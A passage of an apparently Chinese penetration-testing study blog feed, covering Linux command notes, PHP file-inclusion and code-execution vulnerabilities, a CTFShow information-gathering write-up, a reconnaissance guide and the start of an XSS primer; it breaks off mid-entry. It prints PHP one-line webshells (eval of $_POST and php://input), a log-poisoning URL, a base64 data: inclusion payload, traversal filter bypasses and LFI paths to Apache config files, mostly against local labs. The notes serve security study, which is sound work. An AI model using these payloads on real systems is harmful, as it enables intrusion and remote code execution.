取分隔后的第一个到第七个</li></ul><h3 id="awk命令"><a href="#awk命令" class="headerlink" title="awk命令"></a>awk命令</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /etc/passwd | awk -F <span class="hljs-string">&#x27;:&#x27;</span> <span class="hljs-string">&#x27;&#123;print $1, $7&#125;&#x27;</span> |grep -v nologin<br></code></pre></td></tr></table></figure><ul><li>-F 可以多个字符作为分隔符</li></ul><h3 id="实战-查看access-log-txt-apache日志"><a href="#实战-查看access-log-txt-apache日志" class="headerlink" title="实战 查看access_log.txt apache日志"></a>实战 查看access_log.txt apache日志</h3><ul><li><p>原始日志文件<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724202314.png"></p></li><li><p>将ip分隔出来</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log.txt | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f 1<br></code></pre></td></tr></table></figure></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724193829.png"></p><ul><li>通过 <code>sort -u</code> 去重<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log.txt | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f 1 | <span class="hljs-built_in">sort</span> -u<br></code></pre></td></tr></table></figure></li></ul><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724193934.png"></p><ul><li><p>通过 <code>uniq -c</code> 在 <code>sort</code> 完后计数</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log.txt | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724194410.png"></p></li><li><p>通过数量排序</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log.txt | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot; &quot;</span> -f 1 | <span class="hljs-built_in">sort</span> | <span class="hljs-built_in">uniq</span> -c | <span class="hljs-built_in">sort</span> -run<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724194606.png"></p></li><li><p>取出最多的那个ip</p></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log.txt | grep <span class="hljs-string">&#x27;208.68.234.99&#x27;</span> | <span class="hljs-built_in">cut</span> -d <span class="hljs-string">&quot;\&quot;&quot;</span> -f 2 | <span class="hljs-built_in">sort</span> -u<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724194856.png"></p><ul><li>查看指定ip的具体请求<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> access_log.txt | grep <span class="hljs-string">&#x27;208.68.234.99&#x27;</span> | grep admin | <span class="hljs-built_in">uniq</span> -c<br></code></pre></td></tr></table></figure><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724195218.png"></li></ul><h3 id="从这里可以看到用户名为admin的值相应码为200-1000多次401和一次200说明了攻击者在爆破。"><a href="#从这里可以看到用户名为admin的值相应码为200-1000多次401和一次200说明了攻击者在爆破。" class="headerlink" title="从这里可以看到用户名为admin的值相应码为200, 1000多次401和一次200说明了攻击者在爆破。"></a>从这里可以看到用户名为admin的值相应码为200, 1000多次401和一次200说明了攻击者在爆破。</h3><h3 id="comm-diff-vimdiff命令-文本比较工具"><a href="#comm-diff-vimdiff命令-文本比较工具" class="headerlink" title="comm, diff, vimdiff命令 文本比较工具"></a>comm, diff, vimdiff命令 文本比较工具</h3><ul><li><p><code>comm</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">comm</span> scan-a.txt scan-b.txt -12 <span class="hljs-comment"># -12删除第一二列 直接取出相同的</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724202624.png"><br>第三列为共有</p></li><li><p><code>vimdiff scan-a.txt scan-b.txt</code><br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724203025.png"></p></li></ul><h3 id="进程相关"><a href="#进程相关" class="headerlink" title="进程相关"></a>进程相关</h3><ul><li><p><code>pa aux</code></p></li><li><p>查看所有进程<br><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724205117.png"> </p></li><li><p>将一个进程置入后台运行</p><ul><li>通过<code>ctrl + z</code>把进程置入后台, 进程状态为suspended（暂停的）</li><li><code>jobs</code>查看后台进程</li><li><code>bg %1</code> 运行后台进程</li><li><code>fg %1</code> 取回到前端</li><li>通过<code>ping -c 1000 10.0.2.5 &gt; ping.txt</code></li><li>再置入后端就可以实现不影响终端后台运行</li></ul></li><li><p>查找进程</p><ul><li><code>ps -fC firefox</code></li></ul></li><li><p>监控日志</p><ul><li><code>tail -f access.log</code></li></ul></li><li><p>查看谁登录了<code>Linux</code></p><ul><li><code>w</code> <img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724205709.png"></li></ul></li><li><p>周期性运行命令</p><ul><li><code>watch -n 5 w</code></li><li>每5s运行一次who命令</li></ul></li></ul><h3 id="下载相关"><a href="#下载相关" class="headerlink" title="下载相关"></a>下载相关</h3><ul><li><p>wget</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wget -O 1.txt http://127.0.0.1/1.txt<br></code></pre></td></tr></table></figure></li><li><p>curl</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -o 1.txt http://127.0.0.1/1.txt<br></code></pre></td></tr></table></figure></li><li><p>axel</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">axel -a -n 20 -o 1.txt http://127.0.0.1/1.txt<br><span class="hljs-comment"># 这个用于大文件传输 断点续传</span><br></code></pre></td></tr></table></figure></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><ul><li>alias别名<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">alias</span> lsa=<span class="hljs-string">&#x27;ls -la&#x27;</span><br></code></pre></td></tr></table></figure><strong>作为渗透测试人员, 信息收集得去看看别名和环境变量相关的定义</strong></li></ul>]]></content>
    
    
    <categories>
      
      <category>OSCP-Notes</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Linux</tag>
      
      <tag>OSCP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP相关漏洞</title>
    <link href="/2022/07/22/PHP%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/"/>
    <url>/2022/07/22/PHP%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><ul><li><p>常见文件包含函数</p><ul><li>include()：执行到include时才包含文件，找不到被包含文件时只会产生警告，脚本将继续执行</li><li>require()：只要程序一运行就包含文件，找不到被包含的文件时会产生致命错误，并停止脚本</li><li>include_once()和require_once()：若文件中代码已被包含则不会再次包含</li></ul></li><li><p>利用条件</p><ul><li>程序用include()等文件包含函数通过动态变量的范式引入需要包含的文件</li><li>用户能够控制该动态变量</li></ul></li><li><p>漏洞分类</p><ul><li>本地文件包含：可以包含本地文件，在条件允许时甚至能执行代码<ul><li>上传图片马，然后包含</li><li>读敏感文件，读PHP文件</li><li>包含日志文件GetShell</li><li>包含&#x2F;proc&#x2F;self&#x2F;envion文件GetShell</li><li>包含data:或php:&#x2F;&#x2F;input等伪协议</li><li>若有phpinfo则可以包含临时文件</li></ul></li><li>远程文件包含：可以直接执行任意代码<ul><li>要保证php.ini中allow_url_fopen和allow_url_include要为On</li></ul></li></ul></li><li><p>漏洞挖掘</p><ul><li>通过白盒代码审计</li><li>黑盒工具挖掘</li><li>awvs appscan burp</li><li>w3af</li></ul></li><li><p>本地包含漏洞</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220722233518.png"></li></ul></li><li><p>本地包含漏洞注意事项</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220722233635.png"></li></ul></li><li><p>截断绕过</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220722233848.png"></li></ul></li><li><p>其他绕过</p><ul><li>dvwa中级难度的包含，这个主要是过滤了远程文件包含和我们目录的跳转，大小写混合输入就可以绕过远程文件包含的过滤</li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220722233948.png"></li><li>目录跳转的过滤我们可以构造….&#x2F;&#x2F;….&#x2F;&#x2F;xxx.php，方式绕过，由于他只过滤一次，我们可以利用他的过滤动态拼接目录跳转，从而绕过过滤</li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220722234017.png"></li></ul></li><li><p>包含日志(主要是得到日志的路径)</p><ul><li>读日志路径</li><li>文件包含漏洞读取apache配置文件</li><li>index.php?page&#x3D;&#x2F;etc&#x2F;init.d&#x2F;httpd</li><li>index.php?page&#x3D;&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</li><li>默认位置&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log</li></ul></li><li><p>文件包含漏洞实例</p><ul><li>制作错误，写入一句话</li><li><a href="http://127.0.0.1/ekucms/index.php?s=my/show/id/%7B~eval($_POST%5Bx%5D)%7D">http://127.0.0.1/ekucms/index.php?s=my/show/id/{~eval($_POST[x])}</a></li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220723002110.png"></li><li>一句话写入日志文件</li><li>利用包含漏洞包含日志文件</li><li>菜刀连接</li></ul></li><li><p>PHP伪协议</p><ul><li>?page&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;config.php</li><li>访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码</li><li>allow_url_include&#x3D;On时,若执行<a href="http://www.xxx.com/index.php?page=php://input">http://www.xxx.com/index.php?page=php://input</a>, 并且提交数据: <img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220723002741.png"></li><li>结果将在index.php所在文件下生成一句话文件shell.php</li></ul></li></ul><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><ul><li><p>代码执行函数</p><ul><li><code>&lt;?php eval($_POST[cc123]) ?&gt;</code></li><li>PHP中可以执行代码的函数。如eval()、assert()、&#96;&#96;、system()、exec()、shell_exec()、passthru()、 escapeshellcmd()、pcntl_exec()</li></ul></li><li><p>动态代码执行</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220723171157.png"></li></ul></li><li><p>命令执行函数</p><ul><li>在php中可以使用下列5个函数来执行外部的应用程序或函数</li><li>system：执行一个外部的应用程序并显示输出的结果</li><li>exec:执行一个外部的应用程序</li><li>passthru:执行一个UNIX系统命令并显示原始的输出</li><li>shell_exec:执行shell命令并返回输出的结果的字符</li><li>“’’”运算符：与shell_exec函数的功能相同</li></ul></li></ul><h3 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h3><ul><li>变量覆盖漏洞产生<ul><li>变量如果未初始化，且能被用户所控制。  </li><li>在php中，若register_globals 为on时尤其严重</li><li>此为全局变量覆盖漏洞</li><li>当register_global&#x3D;ON时，变量来源可能是各个不同的地方，比如页面的表单，Cookie等。</li></ul></li></ul><h3 id="PHP-反序列与伪协议"><a href="#PHP-反序列与伪协议" class="headerlink" title="PHP 反序列与伪协议"></a>PHP 反序列与伪协议</h3><ul><li><p>php反序列化漏洞</p><ul><li>php反序列化漏洞，又叫php对象注入漏洞。</li><li>序列化与反序列化</li><li>php中有两个函数serialize() 和unserialize()。</li></ul></li><li><p>serialize()</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724000535.png"></li></ul></li><li><p>unserialize()</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724000636.png"></li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724000653.png"></li></ul></li><li><p>反序列化漏洞</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724000731.png"></li></ul></li><li><p>php:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流</p><ul><li>PHP 提供了一些杂项输入&#x2F;输出（IO）流，允许访问 PHP 的输入输出流、标准输入输出和错误描述符， 内存中、磁盘备份的临时文件流以及可以操作其他读取写入文件资源的过滤器。</li><li>php:&#x2F;&#x2F;input<ul><li>php:&#x2F;&#x2F;input 是个可以访问请求的原始数据的只读流。 POST 请求的情况下，最好使用 php:&#x2F;&#x2F;input 来代替 $HTTP_RAW_POST_DATA，因为它不依赖于特定的 php.ini 指令。 而且，这样的情况下 $HTTP_RAW_POST_DATA 默认没有填充， 比激活 always_populate_raw_post_data 潜在需要更少的内存。 enctype&#x3D;”multipart&#x2F;form-data” 的时候 php:&#x2F;&#x2F;input 是无效的。</li></ul></li></ul></li><li><p>php:&#x2F;&#x2F;input将文件包含漏洞变成代码执行漏洞</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001342.png"></li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001411.png"></li></ul></li><li><p>利用php:&#x2F;&#x2F;input</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>); <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$data</span>); <span class="hljs-meta">?&gt;</span><br><span class="hljs-comment"># (注意：需要allow_url_include = On 且 PHP &gt;= 5.2.0)</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001453.png"></p></li><li><p>data URL代码执行</p><ul><li>我们可以将攻击代码转换为data:URL形式进行攻击，但是直接在URL连接中出现一些敏感字符，会导致被waf检测，所以我们需要给攻击代码进行base64编码。</li><li><?php include $_GET['file']?>   保存为c.php</li><li>127.0.0.1&#x2F;c.php?file&#x3D;data:text&#x2F;plain;base64,PD9waHAKcGhwaW5mbygpOwo&#x2F;Pg&#x3D;&#x3D;</li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001550.png"></li></ul></li><li><p>php:&#x2F;&#x2F;filter在文件包含漏洞中的利用</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001641.png"></li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001631.png"></li></ul></li><li><p>thinkphp 框架漏洞</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724001844.png"></li></ul></li><li><p>漏洞利用</p><ul><li>自己找对应版本的exp</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web渗透</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CTFShow练习1-信息收集</title>
    <link href="/2022/07/22/CTFShow%E7%BB%83%E4%B9%A01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/07/22/CTFShow%E7%BB%83%E4%B9%A01-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<p><strong>菜的睡不着觉了</strong></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><ul><li>立一个flag, 每天至少花俩小时做ctf训练</li><li>This flag start at 2022-07-23</li></ul><h3 id="Web1"><a href="#Web1" class="headerlink" title="Web1"></a>Web1</h3><ul><li>找源码</li></ul><h3 id="Web2"><a href="#Web2" class="headerlink" title="Web2"></a>Web2</h3><ul><li>js拦截, 使用view-source:协议</li></ul><h3 id="Web3"><a href="#Web3" class="headerlink" title="Web3"></a>Web3</h3><ul><li>通过burpsuite抓包 flag在返回的响应数据包里面</li></ul><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><ul><li>&#x2F;robots</li></ul><h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><ul><li>phps文件泄露，直接访问index.phps。</li></ul><h3 id="Web6"><a href="#Web6" class="headerlink" title="Web6"></a>Web6</h3><ul><li>代码泄露。直接访问url&#x2F;<a href="http://www.zip/">www.zip</a></li></ul><h3 id="Web7"><a href="#Web7" class="headerlink" title="Web7"></a>Web7</h3><ul><li>git代码泄露，直接访问url&#x2F;.git&#x2F;index.php</li></ul><h3 id="Web8"><a href="#Web8" class="headerlink" title="Web8"></a>Web8</h3><ul><li>信息svn泄露,直接访问url&#x2F;.svn&#x2F;</li></ul><h3 id="Web9"><a href="#Web9" class="headerlink" title="Web9"></a>Web9</h3><ul><li>vim缓存信息泄露，直接访问url&#x2F;index.php.swp</li><li>临时文件是在vim编辑文本时就会创建的文件，如果程序正常退出，临时文件自动删除，如果意外退出就会保留，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容</li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724002754.png"></li></ul><h3 id="Web10"><a href="#Web10" class="headerlink" title="Web10"></a>Web10</h3><ul><li>找cookie</li></ul><h3 id="Web11"><a href="#Web11" class="headerlink" title="Web11"></a>Web11</h3><ul><li>通过dns检查查询flag <a href="https://zijian.aliyun.com/">https://zijian.aliyun.com/</a> TXT 记录，一般指为某个主机名或域名设置的说明。</li></ul><h3 id="Web12"><a href="#Web12" class="headerlink" title="Web12"></a>Web12</h3><ul><li>有时候网站上的公开信息，就是管理员常用密码</li><li>密码竟然是电话号码?!</li></ul><h3 id="Web13"><a href="#Web13" class="headerlink" title="Web13"></a>Web13</h3><ul><li>技术文档Document里找</li></ul><h3 id="Web14"><a href="#Web14" class="headerlink" title="Web14"></a>Web14</h3><ul><li>&#x2F;editor 编辑器漏洞利用</li></ul><h3 id="Web15"><a href="#Web15" class="headerlink" title="Web15"></a>Web15</h3><ul><li>社工 公开邮箱的信息泄漏</li></ul><h3 id="Web16"><a href="#Web16" class="headerlink" title="Web16"></a>Web16</h3><ul><li>php探针 &#x2F;tz.php</li></ul><h3 id="Web17"><a href="#Web17" class="headerlink" title="Web17"></a>Web17</h3><ul><li>备份的sql文件会泄露敏感信息</li><li>backup.sql</li></ul><h3 id="Web18"><a href="#Web18" class="headerlink" title="Web18"></a>Web18</h3><ul><li>抓包js审计搜索flag Unicode解码</li></ul><h3 id="Web19"><a href="#Web19" class="headerlink" title="Web19"></a>Web19</h3><ul><li>审查前端发现aes加密</li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724015251.png"></li><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220724015359.png"></li></ul><h3 id="Web20"><a href="#Web20" class="headerlink" title="Web20"></a>Web20</h3><ul><li>mdb文件是早期asp+access构架的数据库文件</li><li>直接查看url路径添加&#x2F;db&#x2F;db.mdb</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>web渗透</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2022/07/03/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2022/07/03/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><ul><li><p>打点</p><ul><li>web提权</li><li>邮件钓鱼</li><li>社工</li><li>木马</li></ul></li><li><p>目标对象分析</p><ul><li>单个目标服务器(非 Web)</li><li>Web服务器</li><li>整个网络拓扑</li><li>内网<ul><li>网络设备：交换机、路由器、防火墙、ids、等</li><li>网络中的服务器：文件服务器、dns、http、域控制器等</li></ul></li><li>外网：<ul><li>相关联的其他服务器（ip关联、服务关联）</li><li>旁站、c段、邮件服务器、dns服务器、代理服务器等</li></ul></li></ul></li></ul><h3 id="web方向信息收集"><a href="#web方向信息收集" class="headerlink" title="web方向信息收集"></a>web方向信息收集</h3><ul><li>域名信息<ul><li>对应ip收集<ul><li>相关域名对应ip，相关工具：nslookup、一些工具网站</li></ul></li><li>子域名收集<ul><li>工具：layer、subDomainsBrute</li></ul></li><li>whois（注册人）信息查询<ul><li>根据已知域名反查，分析出此域名的注册人、邮箱、电话等</li><li>工具：爱站网、站长工具、微步在线（<a href="https://x.threatbook.cn)/">https://x.threatbook.cn）</a></li><li>site.ip138.com、searchdns.netcraft.com</li></ul></li></ul></li><li>敏感目录<ul><li>暴力破解<ul><li>暴力破解的方法就是需要一个强大的目录名称字典，用来尝试逐个匹配，如果存在通过响应吗的回显来确定目录或者页面是否存在</li></ul></li><li>目录爬行<ul><li>目录爬行原理是通过一些自带网络蜘蛛爬行的工具对网站链接进行快速爬行</li></ul></li></ul></li><li>收集方向<ul><li>robots.txt、后台目录、安装包、上传目录、mysql管理接口、安装页面、phpinfo、编辑器、iis短文件,分析网站cms</li><li>常用工具<ul><li>字典爆破 &gt;&gt; 御剑、dirbuster、wwwscan、IIS_shortname_Scanner等</li><li>蜘蛛爬行 &gt;&gt; 爬行菜刀、webrobot，burp等</li></ul></li></ul></li><li>旁站C段<ul><li>旁站：同服务器其他站点</li><li>C段：同一网段其他服务器</li><li>收集方向：域名、端口、目录</li><li>常用工具：<ul><li>web &gt;&gt;  <a href="http://www.5kik.com/c/%E3%80%81%E7%9B%AE%E5%BD%95%E6%89%AB%E6%8F%8F%E5%B7%A5%E5%85%B7">http://www.5kik.com/c/、目录扫描工具</a></li><li>端口 &gt;&gt; portscan</li></ul></li></ul></li><li>整站分析<ul><li>服务器类型<ul><li>服务器平台、版本等</li></ul></li><li>网站容器<ul><li>搭建网站的服务组件 –&gt; iis、Apache、nginx、tomcat</li></ul></li><li>脚本类型<ul><li>ASP、PHP、JSP、aspx</li></ul></li><li>数据库类型<ul><li>access、sqlserver、mysql、oracle、postgresql等</li></ul></li><li>CMS类型<ul><li>根据经验手工识别</li><li>robots.txt</li></ul></li><li>登录后台<ul><li>审查元素</li></ul></li><li>工具自动化识别</li><li>WAF</li></ul></li><li>google hacker<ul><li>intext:<ul><li>查找网页中含有xx关键字的网站            例：Intext：管理员登录</li></ul></li><li>intitle:<ul><li>查找某个标题                      例：intitle：后台登录</li></ul></li><li>Filetype：<ul><li>查找某个文件类型的文件                   例：数据挖掘 filetype：doc</li></ul></li><li>inurl:<ul><li>查找url中带有某字段的网站         例：inurl：php?id&#x3D;</li></ul></li><li>site：<ul><li>在某域名中查找信息                例：inurl:php?id&#x3D; site:jp</li></ul></li></ul></li><li>url采集<ul><li>采集相关url的同类网站<ul><li>php?id&#x3D;</li><li>漏洞网站</li><li>相同某种指纹网站</li></ul></li><li>常用工具<ul><li>谷歌hacker</li><li>url采集器</li></ul></li><li>信息分析</li></ul></li></ul><h3 id="服务器方向信息收集"><a href="#服务器方向信息收集" class="headerlink" title="服务器方向信息收集"></a>服务器方向信息收集</h3><ul><li>服务信息收集：<ul><li>网络服务：web&#x2F;ftp&#x2F;telnet&#x2F;ssh&#x2F;mail&#x2F;mysql&#x2F;mssql&#x2F;oracle&#x2F;rdp</li><li>服务版本，漏洞等相关信息收集</li><li>系统版本信息收集</li></ul></li></ul><h3 id="网络设备信息收集"><a href="#网络设备信息收集" class="headerlink" title="网络设备信息收集"></a>网络设备信息收集</h3><p>网络设备信息收集</p><ul><li>网络开放端口</li><li>路由</li><li>防火墙</li><li>代理服务器等相关设备的收集</li><li>shodan</li><li>censys</li><li>fofa</li><li>钟馗之眼<ul><li>钟馗之眼搜索引擎偏向web应用层面的搜索</li><li><a href="https://www.zoomeye.org/">https://www.zoomeye.org</a></li></ul></li></ul><h3 id="后台查找"><a href="#后台查找" class="headerlink" title="后台查找"></a>后台查找</h3><ul><li>后台查找<ul><li>弱口令默认后台：admin，admin&#x2F;login.asp，manage，login.asp等等常见后台</li><li>查看网页的链接：一般来说，网站的主页有管理登陆类似的东西，有些可能被管理员删掉</li><li>查看网站图片的属性</li><li>查看网站使用的管理系统，从而确定后台</li><li>用工具查找：wwwscan，intellitamper，御剑</li><li>robots.txt的帮助：robots.txt文件告诉蜘蛛程序在服务器上什么样的文件可以被查看</li><li>GoogleHacker</li><li>查看网站使用的编辑器是否有默认后台</li><li>短文件利用</li><li>sqlmap –sql-shell  load_file(‘d:&#x2F;wwroot&#x2F;index.php’);</li><li>关联性信息<ul><li>同一个建站商</li><li>同一个注册邮箱</li><li>同一个注册人</li></ul></li><li>后台可能不在同一个站上<ul><li>端口后台</li><li>子域名</li><li>完全独立的另一个域名<ul><li>打xss能找到</li></ul></li><li>css样式, js代码</li></ul></li></ul></li></ul><h3 id="CDN绕过"><a href="#CDN绕过" class="headerlink" title="CDN绕过"></a>CDN绕过</h3><ul><li>CDN检测<ul><li>超级ping</li></ul></li><li>查找二级域名</li><li>邮件服务器<ul><li>让服务器主动给你发包</li></ul></li><li>敏感文件邂逅</li><li>查询历史解析ip<ul><li>ip138.com</li></ul></li><li>访问绕过CDN<ul><li>Host绑定ip</li></ul></li></ul><h3 id="整站识别"><a href="#整站识别" class="headerlink" title="整站识别"></a>整站识别</h3><ul><li>whatweb<ul><li>用来识别网站cms及大家平台环境的工具</li><li>whatweb -v neiiiiil.cn</li><li>平台、脚本、cms、容器、数据库等信息探测</li></ul></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>web渗透</tag>
      
      <tag>信息收集</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss</title>
    <link href="/2022/06/23/xss/"/>
    <url>/2022/06/23/xss/</url>
    
    <content type="html"><![CDATA[<h3 id="XSS-介绍及分类"><a href="#XSS-介绍及分类" class="headerlink" title="XSS 介绍及分类"></a>XSS 介绍及分类</h3><ul><li><p>认识xss</p><ul><li>XSS（cross-site script）跨站脚本自1996年诞生以来，一直被OWASP(open web application security project) 评为十大安全漏洞中的第二威胁漏洞。也有黑客把xss当做新型的“缓冲区溢出攻击”，而JavaScript是新型的shellcode。</li></ul></li><li><p>什么是跨站脚本</p><ul><li>是一种经常出现在web应用程序中的计算机安全漏洞，是由于web应用程序对用户的输入过滤不严而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采用cookie资料窃取，会话劫持，钓鱼欺骗等攻击手段</li></ul></li><li><p>跨站脚本实例</p><ul><li><img src="https://raw.githubusercontent.com/Neiiiiil/picgo_img/main/20220623161822.png"></li></ul></li><li><p>XSS危害</p><ul><li>网络钓鱼，包括盗取各类的用户账号</li><li>窃取用户cookie</li><li>窃取用户浏览请回话</li><li>强制弹出广告页面、刷流量</li><li>网页挂马</li><li>提升用户权限，进一步渗透网站</li><li>传播跨站脚本蠕虫等</li></ul></li><li><p>闭合优先的标签</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!--</span><br><span class="hljs-comment">&lt;iframe&gt;</span><br><span class="hljs-comment">&lt;noframes&gt;</span><br><span class="hljs-comment">&lt;noscript&gt;</span><br><span class="hljs-comment">&lt;script&gt;</span><br><span class="hljs-comment">&lt;style&gt;</span><br><span class="hljs-comment">&lt;textarea&gt;</span><br><span class="hljs-comment">&lt;title&gt;</span><br><span class="hljs-comment">&lt;xmp&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>反射型XSS</p><ul><li>反射型跨站脚本也称作非持久型、参数型跨站脚本、这类型的脚本是最常见的 ，也是使用最为广泛的一种，主要用于将恶意的脚本附加到URL地址的参数中</li><li>构造含有恶意js代码的url</li><li>一般使用的将构造好的URL发给受害者，是受害者点击触发，而且只执行一次，非持久化。s</li><li>注入点<ul><li>搜索框</li></ul></li><li>反射型XSS攻击模型<ul><li><img 